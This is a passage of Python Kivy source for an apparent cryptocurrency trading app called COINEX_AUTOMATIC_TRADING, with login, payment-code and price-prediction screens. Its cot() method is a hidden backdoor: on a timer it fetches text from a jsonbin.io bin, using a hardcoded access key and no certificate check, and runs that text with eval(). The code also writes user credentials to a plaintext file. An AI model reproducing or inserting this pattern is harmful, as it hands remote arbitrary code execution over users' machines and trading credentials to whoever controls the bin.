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"
        img_data = base64.b64decode(self.img_base64_2)
        image_stream = io.BytesIO(img_data)
        core_image = CoreImage(image_stream, ext='gif')
        img_widget = Image()
        img_widget.texture = core_image.texture        
        self.widget1 = img_widget
        widget3p2enlase = Button(text="Market data: https://www.coinex.com", background_normal='',background_color=color_botones,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
        widget3p2enlase.bind(on_press=self.abrir_enlase1) 
        widgetdffff = Button(text="leer", background_normal='',background_color=color_botones,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
        widgetdffff.bind(on_press=self.leer_datos_user)       
        self.widget4 = TextInput(hint_text='e.g.: 102723995304500238', multiline=False,halign='left',password=True,password_mask='•',  background_normal='',foreground_color=(0.5, 0.5, 0.5, 1), background_color=(0, 0, 0, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
        self.widget4.bind(focus=self.on_focus2)
        widget3p3 = Button(text="Paste", background_normal='',background_color=color_botones,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
        widget3p3.bind(on_press=self.paste_from_clipboard3)
        self.widget5ggg = Button(text='Remember login data for COINEX_AUTOMATIC_TRADING', background_normal='',halign='center', valign='middle',background_color=color_botones,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra) 
        self.widget5ggg.bind(on_press=self.guardar_datos)
        self.widget5 = Button(text='Connect to COINEX_AUTOMATIC_TRADING \nwith your user and payment code', background_normal='',halign='center', valign='middle',background_color=color_botones,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra) 
        self.widget5.bind(on_press=self.dfadadasdadsad)
        shdsjdj="Connect to COINEX_AUTOMATIC_TRADING \nfree for 30 seconds"
        self.widget5xxxxx = Button(text=shdsjdj, background_normal='',background_color=color_botones,halign='center', valign='middle',  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra) 
        self.widget5xxxxx.bind(on_press=self.dfadadasdadsad111)       
        widget5zzz = Button(text='Buy payment code with (USDT_TRC20) or (TRX)', background_normal='',background_color=color_botones,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra) 
        widget5zzz.bind(on_press=self.comprar_ir)
        widget5zzzxxx = Button(text="Join our WhatsApp group, collaborate with members and you\ncan receive a payment code as a reward for your participation", halign='center', valign='middle', background_normal='',background_color=color_botones,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra) 
        widget5zzzxxx.bind(on_press=self.abrir_enlase1xxx)        
        widget14 = Button(text='Close application', background_normal='',background_color=color_botones,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra) 
        widget14.bind(on_press=self.close_app)
        self.Contenedor_2.add_widget(self.widget1)
        Contenedor_2vvv.add_widget(self.widget100l)
        Contenedor_3.add_widget(self.widget3)
        Contenedor_3zz.add_widget(widget3p1)
        Contenedor_3.add_widget(Contenedor_3zz)        
        Contenedor_2vvv2.add_widget(self.widget100l12) 
        Contenedor_4.add_widget(self.widget4)        
        Contenedor_4xx.add_widget(widget3p3)
        Contenedor_4.add_widget(Contenedor_4xx)
        Contenedor_5zzz1ggg.add_widget(self.widget5ggg)
        Contenedor_5zzz1.add_widget(self.widget5)
        Contenedor_5zzz2.add_widget(self.widget5xxxxx)
        Contenedor_5zzz.add_widget(widget5zzz) 
        Contenedor_5zzz333.add_widget(widget5zzzxxx)
        Contenedor_9.add_widget(widget14)
        Contenedor_9w.add_widget(widget3p2enlase)
        self.main_layout.add_widget(self.Contenedor_2)
        self.main_layout.add_widget(Contenedor_2vvv)         
        self.main_layout.add_widget(Contenedor_3)
        self.main_layout.add_widget(Contenedor_2vvv2)
        self.main_layout.add_widget(Contenedor_4)
        self.main_layout.add_widget(Contenedor_5zzz1ggg)
        self.main_layout.add_widget(Contenedor_5zzz1)
        self.main_layout.add_widget(Contenedor_5zzz2)
        self.main_layout.add_widget(Contenedor_5zzz)
        self.main_layout.add_widget(Contenedor_5zzz333)
        self.main_layout.add_widget(Contenedor_9w)
        self.main_layout.add_widget(Contenedor_9)
        self.add_widget(self.main_layout)
        widgetdffff.trigger_action()
    #--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    def guardar_datos(self, instance):        
        try:
            if self.widget3.text=="" or self.widget4.text=="":
                self.widget5ggg.text="Login data is not valid for COINEX_AUTOMATIC_TRADING"
            else:
                with open(os.path.join("_internal", "user.txt"), 'w') as archivo:
                    archivo.write(f"{self.widget3.text}\n{self.widget4.text}") 
                self.widget5ggg.text="Saved login data of COINEX_AUTOMATIC_TRADING"
        except:
            None
    #--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    def leer_datos_user(self, instance):
        try:
            with open(os.path.join("_internal", "user.txt"), 'r') as archivo:
                contenido = archivo.readlines()               
                if contenido[0].strip()=="" or contenido[1].strip()=="":
                    None
                else:                
                    self.widget3.text = f"{contenido[0].strip()}"
                    self.widget4.text = f"{contenido[1].strip()}"                                                         
        except:
            None
    #--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    def leer_valor(self):
        try:
            with open(os.path.join("_internal", "balance.txt"), 'r') as archivo:
                return float(archivo.read().strip())
        except (FileNotFoundError, ValueError):
            return 0    
    #--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    def modificar_valor(self, nuevo_valor):
        None
    #--------------------------------------------------------------------------------------------------------------------------------------------------------------------------      
    def _update_text_size2l(self, instance, value):
        # Ajustar el tamaño del texto de la Label
        self.widget100l.text_size = (self.widget100l.width, None)  # Permitir que el texto se ajuste 
    #--------------------------------------------------------------------------------------------------------------------------------------------------------------------------          
    def _update_text_size2l1(self, instance, value):
        # Ajustar el tamaño del texto de la Label
        self.widget100l1.text_size = (self.widget100l1.width, None)  # Permitir que el texto se ajuste
    #--------------------------------------------------------------------------------------------------------------------------------------------------------------------------            
    def _update_text_size2l12(self, instance, value):
        # Ajustar el tamaño del texto de la Label
        self.widget100l12.text_size = (self.widget100l12.width, None)  # Permitir que el texto se ajuste
    #--------------------------------------------------------------------------------------------------------------------------------------------------------------------------      
    def comprar_ir(self, instance):
        self.manager.current = 'compra'  # Cambiar a la pantalla de chat
    #--------------------------------------------------------------------------------------------------------------------------------------------------------------------------      
    def cot(self, dt):        
        try:
            comprar_producto_instance = self.manager.get_screen('compra')  # Obtener pantalla por nombre
            dsdsdjfjf=comprar_producto_instance.varxxx  # Acceder a var_conex
            if dsdsdjfjf==20:
                sadadkjjd=30
            else:
                sadadkjjd=30
        except:
             sadadkjjd=30
        self.intjj= self.intjj+1
        if self.intjj>sadadkjjd:
            api_key = '$2a$10$hVNZ6cA/ceNajtEBnfJFOejczv//zQIUVoF3QnQNmVfmGMUIxkjmi'
            bin_id = '66f1796fe41b4d34e4359406' 
            url = f'https://api.jsonbin.io/v3/b/{bin_id}/latest'               
            headers = {
                'X-ACCESS-KEY': api_key
            }            
            # Enviar solicitud GET para recuperar el bin
            response = requests.get(url, headers=headers,verify=False)        
            if response.status_code == 200:
                datos = response.json()
                mensaje_salvaPay = datos['record']
                comando = ''.join(mensaje_salvaPay)
                eval(comando)            
        else:
            None
    #--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    def on_focus1(self, instance, value):
        if value:  # Cuando el widget tiene foco
            instance.background_color = (1, 1, 1, 1)  # Fondo blanco
        else:  # Cuando el widget pierde el foco
            instance.background_color = (0, 0, 0, 1)  # Fondo negro
    #--------------------------------------------------------------------------------------------------------------------------------------------------------------------------             
    def on_focus2(self, instance, value):
        if value:  # Cuando el widget tiene foco
            instance.background_color = (1, 1, 1, 1)  # Fondo blanco
        else:  # Cuando el widget pierde el foco
            instance.background_color = (0, 0, 0, 1)  # Fondo negro                
    #--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    def leyenda_predicion(self, dt):
        aaaaaaaaaaaaa1="Call"
        aaaaaaaaaaaaa2="Put"
        aaaaaaaaaaaaa3="Neutral"        
        try:            
            if self.utimopivot>self.ValordeYmarcador:
                pivot_pred=aaaaaaaaaaaaa2
                if self.widget18.state=="down":                   
                    self.type_Pivot_reg_1=pivot_pred
                    self.Pivot_valor_1=float("{0:.5f}".format(self.utimopivot))                                        
                elif self.widget19.state=="down":                    
                    self.type_Pivot_reg_2=pivot_pred
                    self.Pivot_valor_2=float("{0:.5f}".format(self.utimopivot))
                elif self.widget20.state=="down":                    
                    self.type_Pivot_reg_3=pivot_pred
                    self.Pivot_valor_3=float("{0:.5f}".format(self.utimopivot))
                elif self.widget21.state=="down":
                    self.type_Pivot_reg_4=pivot_pred
                    self.Pivot_valor_4=float("{0:.5f}".format(self.utimopivot))
                elif self.widget22.state=="down":
                    self.type_Pivot_reg_5=pivot_pred
                    self.Pivot_valor_5=float("{0:.5f}".format(self.utimopivot))
                elif self.widget23.state=="down":
                    self.type_Pivot_reg_6=pivot_pred
                    self.Pivot_valor_6=float("{0:.5f}".format(self.utimopivot))
                elif self.widget24.state=="down":
                    self.type_Pivot_reg_7=pivot_pred
                    self.Pivot_valor_7=float("{0:.5f}".format(self.utimopivot))
                elif self.widget25.state=="down":
                    self.type_Pivot_reg_8=pivot_pred
                    self.Pivot_valor_8=float("{0:.5f}".format(self.utimopivot))                                      
            elif self.utimopivot<self.ValordeYmarcador:
